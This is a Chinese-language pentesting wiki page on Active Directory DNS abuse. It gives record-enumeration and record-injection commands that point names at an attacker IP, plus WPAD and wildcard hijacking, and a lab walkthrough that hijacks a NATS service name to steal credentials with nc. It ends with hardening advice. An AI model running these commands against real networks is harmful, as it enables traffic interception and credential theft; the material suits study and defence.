# AD DNS 记录

{{#include ../../banners/hacktricks-training.md}}

默认情况下，Active Directory 中的**任何用户**都可以**枚举**域或林 DNS 区域中的所有 DNS 记录，效果类似于区域传送（用户可以列出 AD 环境中 DNS 区域的子对象）。

工具 [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) 可用于**枚举**并**导出**区域中的**所有 DNS 记录**，以便对内部网络进行侦察。<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

> adidnsdump v1.4.0（2025 年 4 月）新增 JSON/Greppable（`--json`）输出、多线程 DNS 解析，以及绑定到 LDAPS 时对 TLS 1.2/1.3 的支持

更多信息请阅读 [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## 创建 / 修改记录（ADIDNS spoofing）

由于 **Authenticated Users** 组默认对区域 DACL 拥有 **Create Child** 权限，任何域账户（或计算机账户）都可以注册其他记录。 这可用于劫持流量、强制进行 NTLM relay，甚至完全攻陷域。

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py 随 Impacket ≥0.12.0 一同提供)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## 常见攻击原语

1. **通配符记录** – `*.<zone>` 会让 AD DNS 服务器变成类似 LLMNR/NBNS spoofing 的企业级响应器。攻击者可以利用它捕获 NTLM hashes，或将其 relay 到 LDAP/SMB。（要求禁用 WINS-lookup。）<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – 添加 `wpad`（或添加指向攻击者主机的 **NS** 记录，以绕过 Global-Query-Block-List），并透明代理出站 HTTP 请求以窃取凭据。Microsoft 已修补通配符/DNAME 绕过漏洞（CVE-2018-8320），但 **NS-records 仍然有效**。<sup>[[1]](#references)</sup>    
3. **过期条目接管** – 占用之前分配给某台工作站的 IP 地址，关联的 DNS 条目仍会解析，从而无需触碰 DNS 即可实施基于资源的约束委派或 Shadow-Credentials 攻击。    
4. **DHCP → DNS spoofing** – 在默认的 Windows DHCP+DNS 部署中，同一子网内未经身份验证的攻击者可以发送伪造的 DHCP 请求，触发动态 DNS 更新并覆盖任意现有 A 记录（包括域控制器的记录）（Akamai “DDSpoof”，2023）。这会导致 Kerberos/LDAP 上的 machine-in-the-middle 攻击，并可能造成整个域被接管。<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – 更改你控制的机器账户的 `dNSHostName`，注册匹配的 A 记录，然后为该名称申请证书，以冒充 DC。**Certipy** 或 **BloodyAD** 等工具可以全自动完成这一流程。  

包含[序列化目标信息](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073)的 AD DNS 记录可以成为条件 relay 链的一环：调用方需要拥有创建记录的权限、一条会导致目标计算机向该名称进行身份验证的强制认证路径，以及一个接受生成的身份验证的 relay 目标。应单独评估目标协议；入站连接上的 SMB signing 本身并不能确定 HTTPS WinRM 目标是否接受 relay。补丁级别、名称处理方式、Extended Protection 和服务配置都可能改变结果。

---

### 通过过期动态记录 hijack 内部服务（NATS 案例研究）

如果动态更新对所有已验证用户开放，**已注销的服务名称就可以被重新注册，并指向攻击者的基础设施**。Mirage HTB DC 在 DNS scavenging 后仍公开主机名 `nats-svc.mirage.htb`，因此任何低权限用户都可以：<sup>[[3]](#references)</sup>

1. 使用 `dig` **确认记录缺失**并查找 SOA：

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **重新创建记录**，使其指向他们控制的外部/VPN 接口：

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **冒充明文服务**。NATS 客户端会先收到一条 `INFO { ... }` banner，然后才发送凭据，因此只需从真实 broker 复制一条合法 banner，就足以窃取机密：

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

任何解析被劫持名称的客户端，都会立即向 listener 泄露其 JSON `CONNECT` 帧（包括 `"user"`/`"pass"`）。在攻击者主机上运行官方 `nats-server -V` 二进制文件、关闭其日志脱敏功能，或直接用 Wireshark 嗅探会话，都能获取相同的明文凭据，因为 TLS 是可选的。

4. **使用捕获的凭据进行 Pivot** – 在 Mirage 中，被盗的 NATS 账户提供了 JetStream 访问权限，从而暴露了包含可重用 AD 用户名/密码的历史认证事件。

这种模式适用于所有依赖未保护 TCP 握手的 AD 集成服务（HTTP API、RPC、MQTT 等）：一旦 DNS 记录遭到劫持，攻击者就会成为该服务。
有关 broker 端枚举和保留消息的工作流程，请参阅 [NATS / JetStream pentesting](../../network-services-pentesting/4222-pentesting-nats.md)。

---

## Detection & hardening

* 禁止 **Authenticated Users** 在敏感区域拥有 *Create all child objects* 权限，并将动态更新委派给 DHCP 使用的专用账户。
* 如果必须启用动态更新，请将区域设置为 **Secure-only**，并在 DHCP 中启用 **Name Protection**，这样只有所有者计算机对象才能覆盖自己的记录。
* 监控 DNS Server 事件 ID 257/252（动态更新）、770（区域传送），以及对 `CN=MicrosoftDNS,DC=DomainDnsZones` 的 LDAP 写入。
* 使用特意设置为无害的记录或 Global Query Block List，阻止危险名称（`wpad`、`isatap`、`*`）。
* 保持 DNS 服务器及时修补 – 例如，RCE 漏洞 CVE-2024-26224 和 CVE-2024-26231 的 **CVSS 评分达到 9.8**，可远程攻击 Domain Controller。  



## References

- [1] [重新审视 ADIDNS - WPAD、GQBL 及更多内容](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [滥用 DHCP DNS 动态更新伪造 DNS 记录](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage：串联 NFS 泄露、动态 DNS 滥用、NATS 凭据窃取、JetStream 机密信息与 Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [进入区域：使用 adidnsdump 导出 Active Directory DNS](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
